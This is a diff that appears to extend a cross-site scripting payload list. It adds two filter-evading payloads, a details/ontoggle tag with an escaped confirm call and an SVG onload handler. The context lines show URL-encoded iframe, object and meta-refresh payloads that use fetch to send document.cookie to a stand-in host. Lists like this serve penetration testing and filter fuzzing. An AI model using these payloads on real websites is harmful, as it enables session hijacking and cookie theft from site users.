@@ -310,3 +310,5 @@ meta http-equiv="refresh" content=" ; url=javascript:alert('XSS');">
 %22%3E%3Ciframe%20src=%22javascript:eval(%27fetch(%27https://example.com/?cookie=%27%20+%20document.cookie)%27)%22%3E%3C/iframe%3E
 %22%3E%3Cobject%20data=%22javascript:eval(%27fetch(%27https://example.com/?cookie=%27%20+%20document.cookie)%27)%22%3E%3C/object%3E
 %22%3E%3Cmeta%20http-equiv=%22refresh%22%20content=%220;%20url=javascript:eval(%27fetch(%27https://example.com/?cookie=%27%20+%20document.cookie)%27)%22/%3E
+<details%0Aopen%0AonToGgle%0A=%0Aabc=(co\u006efirm);abc%28%60xss%60%26%2300000000000000000041//
+%3CSVG/oNlY=1%20ONlOAD=confirm(document.domain)%3E
